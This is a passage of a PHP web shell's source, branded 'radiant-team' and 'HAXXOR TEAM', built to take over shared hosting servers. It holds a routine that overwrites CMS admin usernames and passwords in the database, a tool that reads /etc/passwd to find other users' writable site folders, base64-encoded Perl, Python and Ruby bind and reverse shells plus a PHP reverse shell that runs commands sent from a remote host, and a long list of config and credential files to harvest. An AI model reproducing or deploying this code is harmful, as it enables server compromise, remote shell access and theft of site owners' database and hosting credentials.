                        } else {
                            $cek_login3 = file_get_contents("$target2/adminweb/");
                            $cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
                            if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
                                $url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
                            } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
                                $url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
                            } else {
                                $url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>I don't know where the admin login is :p</font> ]<br>";
                            }
                        }
                    } else {
                        $cek_login = file_get_contents("$target/adminweb/");
                        $cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
                        if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
                            $url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
                        } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
                            $url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
                        } else {
                            $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>I don't know where the admin login is :p</font> ]<br>";
                        }
                    }
                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => Lokomedia<br>";
                    if(preg_match('/Error, can t get the domain name/', $url_target)) {
                        echo $url_target2;
                    } else {
                        echo $url_target;
                    }
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=lime>Successfully edit user, please login with new user & pass.</font><br><br>";
                    }
                    mysql_close($conn);
                }
            }
        }
    } else {
        echo "<center>
        <h1>Auto Edit User Config</h1>
        <form method='post'>
        DIR Config: <br>
        <input type='text' size='50' name='config_dir' value='$dir'><br><br>
        Set User & Pass: <br>
        <input type='text' name='user_baru' value='radiant-team' placeholder='user_baru'><br>
        <input type='text' name='pass_baru' value='radiant-team
        ' placeholder='pass_baru'><br>
        <input type='submit' name='hajar' value='SUBMIT' style='width: 215px;'>
        </form>
        <span>NOTE: This tool works if run in a folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
        ";
    }

	} elseif ($_GET['web'] == 'jumping') {
    $i = 0;
    echo "<pre><div class='margin: 5px auto;'>";
    $etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
    while ($passwd = fgets($etc)) {
        if ($passwd == '' || !$etc) {
            echo "<font color=red>Can't read /etc/passwd</font>";
        } else {
            preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
            foreach ($user_jumping[1] as $user_con7ext_jump) {
                $user_jumping_dir = "/home/$user_con7ext_jump/public_html";
                if (is_readable($user_jumping_dir)) {
                    $i++;
                    $jrw = "[<font color=white>R</font>] <a href='?path=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
                    if (is_writable($user_jumping_dir)) {
                        $jrw = "[<font color=white>RW</font>] <a href='?path=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
                    }
                    echo $jrw;
                    if (function_exists('posix_getpwuid')) {
                        $domain_jump = file_get_contents("/etc/named.conf");
                        if ($domain_jump == '') {
                            echo " => ( <font color=red>can't get the domain name</font> )<br>";
                        } else {
                            preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
                            foreach ($domains_jump[1] as $dj) {
                                $user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                                $user_jumping_url = $user_jumping_url['name'];
                                if ($user_jumping_url == $user_con7ext_jump) {
                                    echo " => ( <u>$dj</u> )<br>";
                                    break;
                                }
                            }
                        }
                    } else {
                        echo "<br>";
                    }
                }
            }
        }
    }
    if ($i == 0) {
    } else {
        echo "<br>Total " . $i . " Dir" . gethostbyname($_SERVER['HTTP_HOST']) . "";
    }
    echo "</div></pre>";
} elseif ($_GET['backconnect'] == 'tool') {
    echo "<br><br><center><form method=post>
<br>	<span>Bind port to /bin/sh [Perl]</span><br/>
	Port: <input type='text' name='port' value='443'> <input type=submit name=bpl value='>>'>
<br><br>
		<span>Back-connect</span><br/>
	Server: <input type='text' name='server' placeholder='" . $_SERVER['REMOTE_ADDR'] . "'> Port: <input type='text' name='port' placeholder='443'><select class='select' name='backconnect'  style='width: 100px;' height='10'><option value='perl'>Perl</option><option value='php'>PHP</option><option value='python'>Python</option><option value='ruby'>Ruby</option></select>
   <input type=submit value='>>'>";
   if ($_POST['bpl']) {
        $bp = base64_decode("IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=");
        $brt = @fopen('bp.pl', 'w');
        fwrite($brt, $bp);
        $out = exe("perl bp.pl " . $_POST['port'] . " 1>/dev/null 2>&1 &");
        sleep(1);
        echo "<pre>$out
" . exe("ps aux | grep bp.pl") . "</pre>";
        unlink("bp.pl");
    }
    if ($_POST['backconnect'] == 'perl') {
        $bc = base64_decode("IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7");
        $plbc = @fopen('bc.pl', 'w');
        fwrite($plbc, $bc);
        $out = exe("perl bc.pl " . $_POST['server'] . " " . $_POST['port'] . " 1>/dev/null 2>&1 &");
        sleep(1);
        echo "<pre>$out
" . exe("ps aux | grep bc.pl") . "</pre>";
        unlink("bc.pl");
    }
}
if ($_POST['backconnect'] == 'python') {
        $becaa = base64_decode("IyEvdXNyL2Jpbi9weXRob24NCiNVc2FnZTogcHl0aG9uIGZpbGVuYW1lLnB5IEhPU1QgUE9SVA0KaW1wb3J0IHN5cywgc29ja2V0LCBvcywgc3VicHJvY2Vzcw0KaXBsbyA9IHN5cy5hcmd2WzFdDQpwb3J0bG8gPSBpbnQoc3lzLmFyZ3ZbMl0pDQpzb2NrZXQuc2V0ZGVmYXVsdHRpbWVvdXQoNjApDQpkZWYgcHliYWNrY29ubmVjdCgpOg0KICB0cnk6DQogICAgam1iID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pDQogICAgam1iLmNvbm5lY3QoKGlwbG8scG9ydGxvKSkNCiAgICBqbWIuc2VuZCgnJydcblB5dGhvbiBCYWNrQ29ubmVjdCBCeSBDb243ZXh0IC0gWGFpIFN5bmRpY2F0ZVxuVGhhbmtzIEdvb2dsZSBGb3IgUmVmZXJlbnNpXG5cbicnJykNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwwKQ0KICAgIG9zLmR1cDIoam1iLmZpbGVubygpLDEpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMikNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwzKQ0KICAgIHNoZWxsID0gc3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pDQogIGV4Y2VwdCBzb2NrZXQudGltZW91dDoNCiAgICBwcmludCAiVGltT3V0Ig0KICBleGNlcHQgc29ja2V0LmVycm9yLCBlOg0KICAgIHByaW50ICJFcnJvciIsIGUNCnB5YmFja2Nvbm5lY3QoKQ==");
        $pbcaa = @fopen('bcpyt.py', 'w');
        fwrite($pbcaa, $becaa);
        $out1 = exe("python bcpyt.py " . $_POST['server'] . " " . $_POST['port']);
        sleep(1);
        echo "<pre>$out1
" . exe("ps aux | grep bcpyt.py") . "</pre>";
        unlink("bcpyt.py");
    }
    if ($_POST['backconnect'] == 'ruby') {
        $becaak = base64_decode("IyEvdXNyL2Jpbi9lbnYgcnVieQ0KIyBkZXZpbHpjMGRlLm9yZyAoYykgMjAxMg0KIw0KIyBiaW5kIGFuZCByZXZlcnNlIHNoZWxsDQojIGIzNzRrDQpyZXF1aXJlICdzb2NrZXQnDQpyZXF1aXJlICdwYXRobmFtZScNCg0KZGVmIHVzYWdlDQoJcHJpbnQgImJpbmQgOlxyXG4gIHJ1YnkgIiArIEZpbGUuYmFzZW5hbWUoX19GSUxFX18pICsgIiBbcG9ydF1cclxuIg0KCXByaW50ICJyZXZlcnNlIDpcclxuICBydWJ5ICIgKyBGaWxlLmJhc2VuYW1lKF9fRklMRV9fKSArICIgW3BvcnRdIFtob3N0XVxyXG4iDQplbmQNCg0KZGVmIHN1Y2tzDQoJc3Vja3MgPSBmYWxzZQ0KCWlmIFJVQllfUExBVEZPUk0uZG93bmNhc2UubWF0Y2goJ21zd2lufHdpbnxtaW5ndycpDQoJCXN1Y2tzID0gdHJ1ZQ0KCWVuZA0KCXJldHVybiBzdWNrcw0KZW5kDQoNCmRlZiByZWFscGF0aChzdHIpDQoJcmVhbCA9IHN0cg0KCWlmIEZpbGUuZXhpc3RzPyhzdHIpDQoJCWQgPSBQYXRobmFtZS5uZXcoc3RyKQ0KCQlyZWFsID0gZC5yZWFscGF0aC50b19zDQoJZW5kDQoJaWYgc3Vja3MNCgkJcmVhbCA9IHJlYWwuZ3N1YigvXC8vLCJcXCIpDQoJZW5kDQoJcmV0dXJuIHJlYWwNCmVuZA0KDQppZiBBUkdWLmxlbmd0aCA9PSAxDQoJaWYgQVJHVlswXSA9fiAvXlswLTldezEsNX0kLw0KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzBdKQ0KCWVsc2UNCgkJdXNhZ2UNCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCgkJZXhpdA0KCWVuZA0KCXNlcnZlciA9IFRDUFNlcnZlci5uZXcoIiIsIHBvcnQpDQoJcyA9IHNlcnZlci5hY2NlcHQNCglwb3J0ID0gcy5wZWVyYWRkclsxXQ0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdDQoJcy5wcmludCAiKioqIGNvbm5lY3RlZFxyXG4iDQoJcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fVxyXG4iDQoJYmVnaW4NCgkJaWYgbm90IHN1Y2tzDQoJCQlmID0gcy50b19pDQoJCQlleGVjIHNwcmludGYoIi9iaW4vc2ggLWkgXDxcJiVkIFw+XCYlZCAyXD5cJiVkIixmLGYsZikNCgkJZWxzZQ0KCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQl3aGlsZSBsaW5lID0gcy5nZXRzDQoJCQkJcmFpc2UgZXJyb3JCcm8gaWYgbGluZSA9fiAvXmRpZVxyPyQvDQoJCQkJaWYgbm90IGxpbmUuY2hvbXAgPT0gIiINCgkJCQkJaWYgbGluZSA9fiAvY2QgLiovaQ0KCQkJCQkJbGluZSA9IGxpbmUuZ3N1YigvY2QgL2ksICcnKS5jaG9tcA0KCQkJCQkJaWYgRmlsZS5kaXJlY3Rvcnk/KGxpbmUpDQoJCQkJCQkJbGluZSA9IHJlYWxwYXRoKGxpbmUpDQoJCQkJCQkJRGlyLmNoZGlyKGxpbmUpDQoJCQkJCQllbmQNCgkJCQkJCXMucHJpbnQgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+Ig0KCQkJCQllbHNpZiBsaW5lID1+IC9cdzouKi9pDQoJCQkJCQlpZiBGaWxlLmRpcmVjdG9yeT8obGluZS5jaG9tcCkNCgkJCQkJCQlEaXIuY2hkaXIobGluZS5jaG9tcCkNCgkJCQkJCWVuZA0KCQkJCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQkJCWVsc2UNCgkJCQkJCUlPLnBvcGVuKGxpbmUsInIiKXt8aW98cy5wcmludCBpby5yZWFkICsgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+In0NCgkJCQkJZW5kDQoJCQkJZW5kDQoJCQllbmQNCgkJZW5kDQoJcmVzY3VlIGVycm9yQnJvDQoJCXB1dHMgIioqKiAje25hbWV9OiN7cG9ydH0gZGlzY29ubmVjdGVkIg0KCWVuc3VyZQ0KCQlzLmNsb3NlDQoJCXMgPSBuaWwNCgllbmQNCmVsc2lmIEFSR1YubGVuZ3RoID09IDINCglpZiBBUkdWWzBdID1+IC9eWzAtOV17MSw1fSQvDQoJCXBvcnQgPSBJbnRlZ2VyKEFSR1ZbMF0pDQoJCWhvc3QgPSBBUkdWWzFdDQoJZWxzaWYgQVJHVlsxXSA9fiAvXlswLTldezEsNX0kLw0KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzFdKQ0KCQlob3N0ID0gQVJHVlswXQ0KCWVsc2UNCgkJdXNhZ2UNCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCgkJZXhpdA0KCWVuZA0KCXMgPSBUQ1BTb2NrZXQubmV3KCIje2hvc3R9IiwgcG9ydCkNCglwb3J0ID0gcy5wZWVyYWRkclsxXQ0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdDQoJcy5wcmludCAiKioqIGNvbm5lY3RlZFxyXG4iDQoJcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fSINCgliZWdpbg0KCQlpZiBub3Qgc3Vja3MNCgkJCWYgPSBzLnRvX2kNCgkJCWV4ZWMgc3ByaW50ZigiL2Jpbi9zaCAtaSBcPFwmJWQgXD5cJiVkIDJcPlwmJWQiLCBmLCBmLCBmKQ0KCQllbHNlDQoJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCgkJCXdoaWxlIGxpbmUgPSBzLmdldHMNCgkJCQlyYWlzZSBlcnJvckJybyBpZiBsaW5lID1+IC9eZGllXHI/JC8NCgkJCQlpZiBub3QgbGluZS5jaG9tcCA9PSAiIg0KCQkJCQlpZiBsaW5lID1+IC9jZCAuKi9pDQoJCQkJCQlsaW5lID0gbGluZS5nc3ViKC9jZCAvaSwgJycpLmNob21wDQoJCQkJCQlpZiBGaWxlLmRpcmVjdG9yeT8obGluZSkNCgkJCQkJCQlsaW5lID0gcmVhbHBhdGgobGluZSkNCgkJCQkJCQlEaXIuY2hkaXIobGluZSkNCgkJCQkJCWVuZA0KCQkJCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQkJCWVsc2lmIGxpbmUgPX4gL1x3Oi4qL2kNCgkJCQkJCWlmIEZpbGUuZGlyZWN0b3J5PyhsaW5lLmNob21wKQ0KCQkJCQkJCURpci5jaGRpcihsaW5lLmNob21wKQ0KCQkJCQkJZW5kDQoJCQkJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCgkJCQkJZWxzZQ0KCQkJCQkJSU8ucG9wZW4obGluZSwiciIpe3xpb3xzLnByaW50IGlvLnJlYWQgKyAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4ifQ0KCQkJCQllbmQNCgkJCQllbmQNCgkJCWVuZA0KCQllbmQNCglyZXNjdWUgZXJyb3JCcm8NCgkJcHV0cyAiKioqICN7bmFtZX06I3twb3J0fSBkaXNjb25uZWN0ZWQiDQoJZW5zdXJlDQoJCXMuY2xvc2UNCgkJcyA9IG5pbA0KCWVuZA0KZWxzZQ0KCXVzYWdlDQoJZXhpdA0KZW5k");
        $pbcaak = @fopen('bcruby.rb', 'w');
        fwrite($pbcaak, $becaak);
        $out2 = exe("ruby bcruby.rb " . $_POST['server'] . " " . $_POST['port']);
        sleep(1);
        echo "<pre>$out2
" . exe("ps aux | grep bcruby.rb") . "</pre>";
        unlink("bcruby.rb");
    }
    if ($_POST['backconnect'] == 'php') {
        $ip = $_POST['server'];
        $port = $_POST['port'];
        $sockfd = fsockopen($ip, $port, $errno, $errstr);
        if ($errno != 0) {
            echo "<font color='red'>$errno : $errstr</font>";
        } else if (!$sockfd) {
            $result = "<p>Unexpected error has occured, connection may have failed.</p>";
        } else {
            fputs($sockfd, "
                
{################################################################}
                
             ..:: BackConnect Php By HAXXOR TEAM ::..
                
{################################################################}
");
            $dir = shell_exec("pwd");
            $sysinfo = shell_exec("uname -a");
            $time = Shell_exec("time");
            $len = 1337;
            fputs($sockfd, "User ", $sysinfo, "connected @ ", $time, "

");
            while (!feof($sockfd)) {
                $cmdPrompt = '[HCA]#:> ';
                fputs($sockfd, $cmdPrompt);
                $command = fgets($sockfd, $len);
                fputs($sockfd, "
" . shell_exec($command) . "

");
            }
            fclose($sockfd);
        }
    }
    elseif($_GET['do'] == 'config') {
    if($_POST){
        $passwd = $_POST['passwd'];
        mkdir("radiant_config", 0777);
        $isi_htc = "Options all\nRequire None\nSatisfy Any";
        $htc = fopen("radiant_config/.htaccess","w");
        fwrite($htc, $isi_htc);
        preg_match_all('/(.*?):x:/', $passwd, $user_config);
        foreach($user_config[1] as $user_chonx) {
            $user_config_dir = "/home/$user_chonx/public_html/";
            if(is_readable($user_config_dir)) {
                $grab_config = array(
                                        "/home/$user_chonx/.my.cnf" => "cpanel",
                    "/home/$user_chonx/.accesshash" => "WHM-accesshash",
                    "/home/$user_chonx/public_html/bw-configs/config.ini" => "BosWeb",
                    "/home/$user_chonx/public_html/config/koneksi.php" => "Lokomedia",
                    "/home/$user_chonx/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
                    "/home/$user_chonx/public_html/clientarea/configuration.php" => "WHMCS",                
                    "/home/$user_chonx/public_html/whmcs/configuration.php" => "WHMCS",
                    "/home/$user_chonx/public_html/forum/config.php" => "phpBB",
                    "/home/$user_chonx/public_html/sites/default/settings.php" => "Drupal",
                    "/home/$user_chonx/public_html/config/settings.inc.php" => "PrestaShop",
                    "/home/$user_chonx/public_html/app/etc/local.xml" => "Magento",
                    "/home/$user_chonx/public_html/admin/config.php" => "OpenCart",
                    "/home/$user_chonx/public_html/slconfig.php" => "Sitelok",
                    "/home/$user_chonx/public_html/application/config/database.php" => "Ellislab",                  
                    "/home/$user_chonx/public_html/whm/configuration.php" => "WHMCS",
                    "/home/$user_chonx/public_html/whmc/WHM/configuration.ph" => "WHMC",
                    "/home/$user_chonx/public_html/central/configuration.php" => "WHM Central",
                    "/home/$user_chonx/public_html/whm/WHMCS/configuration.php" => "WHMCS",
                    "/home/$user_chonx/public_html/whm/whmcs/configuration.php" => "WHMCS",
                    "/home/$user_chonx/public_html/submitticket.php" => "WHMCS",                                        
                    "/home/$user_chonx/public_html/configuration.php" => "Joomla",                  
                    "/home/$user_chonx/public_html/Joomla/configuration.php" => "JoomlaJoomla",
                    "/home/$user_chonx/public_html/joomla/configuration.php" => "JoomlaJoomla",
                    "/home/$user_chonx/public_html/JOOMLA/configuration.php" => "JoomlaJoomla",     
                    "/home/$user_chonx/public_html/Home/configuration.php" => "JoomlaHome",
                    "/home/$user_chonx/public_html/HOME/configuration.php" => "JoomlaHome",
                    "/home/$user_chonx/public_html/home/configuration.php" => "JoomlaHome",
                    "/home/$user_chonx/public_html/NEW/configuration.php" => "JoomlaNew",
                    "/home/$user_chonx/public_html/New/configuration.php" => "JoomlaNew",
                    "/home/$user_chonx/public_html/new/configuration.php" => "JoomlaNew",
                    "/home/$user_chonx/public_html/News/configuration.php" => "JoomlaNews",
                    "/home/$user_chonx/public_html/NEWS/configuration.php" => "JoomlaNews",
                    "/home/$user_chonx/public_html/news/configuration.php" => "JoomlaNews",
                    "/home/$user_chonx/public_html/Cms/configuration.php" => "JoomlaCms",
                    "/home/$user_chonx/public_html/CMS/configuration.php" => "JoomlaCms",
                    "/home/$user_chonx/public_html/cms/configuration.php" => "JoomlaCms",
                    "/home/$user_chonx/public_html/Main/configuration.php" => "JoomlaMain",
                    "/home/$user_chonx/public_html/MAIN/configuration.php" => "JoomlaMain",
                    "/home/$user_chonx/public_html/main/configuration.php" => "JoomlaMain",
                    "/home/$user_chonx/public_html/Blog/configuration.php" => "JoomlaBlog",
                    "/home/$user_chonx/public_html/BLOG/configuration.php" => "JoomlaBlog",
                    "/home/$user_chonx/public_html/blog/configuration.php" => "JoomlaBlog",
                    "/home/$user_chonx/public_html/Blogs/configuration.php" => "JoomlaBlogs",
                    "/home/$user_chonx/public_html/BLOGS/configuration.php" => "JoomlaBlogs",
                    "/home/$user_chonx/public_html/blogs/configuration.php" => "JoomlaBlogs",
                    "/home/$user_chonx/public_html/beta/configuration.php" => "JoomlaBeta",
                    "/home/$user_chonx/public_html/Beta/configuration.php" => "JoomlaBeta",
                    "/home/$user_chonx/public_html/BETA/configuration.php" => "JoomlaBeta",
                    "/home/$user_chonx/public_html/PRESS/configuration.php" => "JoomlaPress",
                    "/home/$user_chonx/public_html/Press/configuration.php" => "JoomlaPress",
                    "/home/$user_chonx/public_html/press/configuration.php" => "JoomlaPress",
                    "/home/$user_chonx/public_html/Wp/configuration.php" => "JoomlaWp",
                    "/home/$user_chonx/public_html/wp/configuration.php" => "JoomlaWp",
                    "/home/$user_chonx/public_html/WP/configuration.php" => "JoomlaWP",
                    "/home/$user_chonx/public_html/portal/configuration.php" => "JoomlaPortal",
                    "/home/$user_chonx/public_html/PORTAL/configuration.php" => "JoomlaPortal",
                    "/home/$user_chonx/public_html/Portal/configuration.php" => "JoomlaPortal",                 
                    "/home/$user_chonx/public_html/wp-config.php" => "WordPress",
                    "/home/$user_chonx/public_html/wordpress/wp-config.php" => "WordPressWordpress",
                    "/home/$user_chonx/public_html/Wordpress/wp-config.php" => "WordPressWordpress",
                    "/home/$user_chonx/public_html/WORDPRESS/wp-config.php" => "WordPressWordpress",        
                    "/home/$user_chonx/public_html/Home/wp-config.php" => "WordPressHome",
                    "/home/$user_chonx/public_html/HOME/wp-config.php" => "WordPressHome",
                    "/home/$user_chonx/public_html/home/wp-config.php" => "WordPressHome",
                    "/home/$user_chonx/public_html/NEW/wp-config.php" => "WordPressNew",
                    "/home/$user_chonx/public_html/New/wp-config.php" => "WordPressNew",
                    "/home/$user_chonx/public_html/new/wp-config.php" => "WordPressNew",
                    "/home/$user_chonx/public_html/News/wp-config.php" => "WordPressNews",
                    "/home/$user_chonx/public_html/NEWS/wp-config.php" => "WordPressNews",
                    "/home/$user_chonx/public_html/news/wp-config.php" => "WordPressNews",
                    "/home/$user_chonx/public_html/Cms/wp-config.php" => "WordPressCms",
                    "/home/$user_chonx/public_html/CMS/wp-config.php" => "WordPressCms",
                    "/home/$user_chonx/public_html/cms/wp-config.php" => "WordPressCms",
                    "/home/$user_chonx/public_html/Main/wp-config.php" => "WordPressMain",
                    "/home/$user_chonx/public_html/MAIN/wp-config.php" => "WordPressMain",
                    "/home/$user_chonx/public_html/main/wp-config.php" => "WordPressMain",
                    "/home/$user_chonx/public_html/Blog/wp-config.php" => "WordPressBlog",
                    "/home/$user_chonx/public_html/BLOG/wp-config.php" => "WordPressBlog",
                    "/home/$user_chonx/public_html/blog/wp-config.php" => "WordPressBlog",
                    "/home/$user_chonx/public_html/Blogs/wp-config.php" => "WordPressBlogs",
                    "/home/$user_chonx/public_html/BLOGS/wp-config.php" => "WordPressBlogs",
                    "/home/$user_chonx/public_html/blogs/wp-config.php" => "WordPressBlogs",
                    "/home/$user_chonx/public_html/beta/wp-config.php" => "WordPressBeta",
                    "/home/$user_chonx/public_html/Beta/wp-config.php" => "WordPressBeta",
                    "/home/$user_chonx/public_html/BETA/wp-config.php" => "WordPressBeta",
                    "/home/$user_chonx/public_html/PRESS/wp-config.php" => "WordPressPress",
                    "/home/$user_chonx/public_html/Press/wp-config.php" => "WordPressPress",
                    "/home/$user_chonx/public_html/press/wp-config.php" => "WordPressPress",
                    "/home/$user_chonx/public_html/Wp/wp-config.php" => "WordPressWp",
                    "/home/$user_chonx/public_html/wp/wp-config.php" => "WordPressWp",
                    "/home/$user_chonx/public_html/WP/wp-config.php" => "WordPressWP",
                    "/home/$user_chonx/public_html/portal/wp-config.php" => "WordPressPortal",
                    "/home/$user_chonx/public_html/PORTAL/wp-config.php" => "WordPressPortal",
                    "/home/$user_chonx/public_html/Portal/wp-config.php" => "WordPressPortal",
                                        "/home1/$user_chonx/.my.cnf" => "cpanel",
                    "/home1/$user_chonx/.accesshash" => "WHM-accesshash",
                    "/home1/$user_chonx/public_html/bw-configs/config.ini" => "BosWeb",
                    "/home1/$user_chonx/public_html/config/koneksi.php" => "Lokomedia",
                    "/home1/$user_chonx/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
                    "/home1/$user_chonx/public_html/clientarea/configuration.php" => "WHMCS",               
                    "/home1/$user_chonx/public_html/whmcs/configuration.php" => "WHMCS",
                    "/home1/$user_chonx/public_html/forum/config.php" => "phpBB",
                    "/home1/$user_chonx/public_html/sites/default/settings.php" => "Drupal",
                    "/home1/$user_chonx/public_html/config/settings.inc.php" => "PrestaShop",
                    "/home1/$user_chonx/public_html/app/etc/local.xml" => "Magento",
                    "/home1/$user_chonx/public_html/admin/config.php" => "OpenCart",
                    "/home1/$user_chonx/public_html/slconfig.php" => "Sitelok",
                    "/home1/$user_chonx/public_html/application/config/database.php" => "Ellislab",                 
                    "/home1/$user_chonx/public_html/whm/configuration.php" => "WHMCS",
                    "/home1/$user_chonx/public_html/whmc/WHM/configuration.ph" => "WHMC",
                    "/home1/$user_chonx/public_html/central/configuration.php" => "WHM Central",
                    "/home1/$user_chonx/public_html/whm/WHMCS/configuration.php" => "WHMCS",
                    "/home1/$user_chonx/public_html/whm/whmcs/configuration.php" => "WHMCS",
                    "/home1/$user_chonx/public_html/submitticket.php" => "WHMCS",                                       
                    "/home1/$user_chonx/public_html/configuration.php" => "Joomla",                 
                    "/home1/$user_chonx/public_html/Joomla/configuration.php" => "JoomlaJoomla",
                    "/home1/$user_chonx/public_html/joomla/configuration.php" => "JoomlaJoomla",
                    "/home1/$user_chonx/public_html/JOOMLA/configuration.php" => "JoomlaJoomla",        
                    "/home1/$user_chonx/public_html/Home/configuration.php" => "JoomlaHome",
                    "/home1/$user_chonx/public_html/HOME/configuration.php" => "JoomlaHome",
                    "/home1/$user_chonx/public_html/home/configuration.php" => "JoomlaHome",
                    "/home1/$user_chonx/public_html/NEW/configuration.php" => "JoomlaNew",
                    "/home1/$user_chonx/public_html/New/configuration.php" => "JoomlaNew",
                    "/home1/$user_chonx/public_html/new/configuration.php" => "JoomlaNew",
                    "/home1/$user_chonx/public_html/News/configuration.php" => "JoomlaNews",
                    "/home1/$user_chonx/public_html/NEWS/configuration.php" => "JoomlaNews",
                    "/home1/$user_chonx/public_html/news/configuration.php" => "JoomlaNews",
                    "/home1/$user_chonx/public_html/Cms/configuration.php" => "JoomlaCms",
                    "/home1/$user_chonx/public_html/CMS/configuration.php" => "JoomlaCms",
                    "/home1/$user_chonx/public_html/cms/configuration.php" => "JoomlaCms",
                    "/home1/$user_chonx/public_html/Main/configuration.php" => "JoomlaMain",
                    "/home1/$user_chonx/public_html/MAIN/configuration.php" => "JoomlaMain",
                    "/home1/$user_chonx/public_html/main/configuration.php" => "JoomlaMain",
                    "/home1/$user_chonx/public_html/Blog/configuration.php" => "JoomlaBlog",
                    "/home1/$user_chonx/public_html/BLOG/configuration.php" => "JoomlaBlog",
                    "/home1/$user_chonx/public_html/blog/configuration.php" => "JoomlaBlog",
                    "/home1/$user_chonx/public_html/Blogs/configuration.php" => "JoomlaBlogs",
                    "/home1/$user_chonx/public_html/BLOGS/configuration.php" => "JoomlaBlogs",
